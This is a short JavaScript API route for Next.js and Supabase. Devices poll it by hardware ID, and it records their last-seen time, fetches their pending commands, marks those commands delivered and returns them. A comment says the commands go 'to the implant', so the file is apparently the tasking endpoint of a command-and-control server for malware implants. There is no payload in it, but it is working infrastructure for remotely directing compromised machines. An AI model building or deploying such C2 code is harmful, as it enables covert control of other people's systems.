import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY);

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }
    
    const { deviceId } = req.query; // This is the hardware ID

    // 1. Find the device's internal UUID from its hardware ID
    const { data: device, error: deviceError } = await supabase
        .from('devices')
        .select('id')
        .eq('device_id', deviceId)
        .single();

    if (deviceError || !device) {
        return res.status(404).json({ error: 'Device not found' });
    }

    // Device is polling, update its last_seen status
    await supabase.from('devices').update({ last_seen: new Date().toISOString() }).eq('id', device.id);

    // 2. Fetch pending commands for this device's UUID
    const { data: commands, error: commandsError } = await supabase
        .from('commands')
        .select('*')
        .eq('device_uuid', device.id)
        .eq('status', 'pending');

    if (commandsError) {
        console.error('Task Fetch Error:', commandsError.message);
        return res.status(500).json({ error: 'Failed to fetch tasks' });
    }

    if (commands && commands.length > 0) {
        // 3. Atomically mark commands as 'delivered' to prevent re-issuing
        const commandIds = commands.map(c => c.id);
        await supabase
            .from('commands')
            .update({ status: 'delivered' })
            .in('id', commandIds);
    }
    
    // 4. Return the commands to the implant
    res.status(200).json(commands || []);
}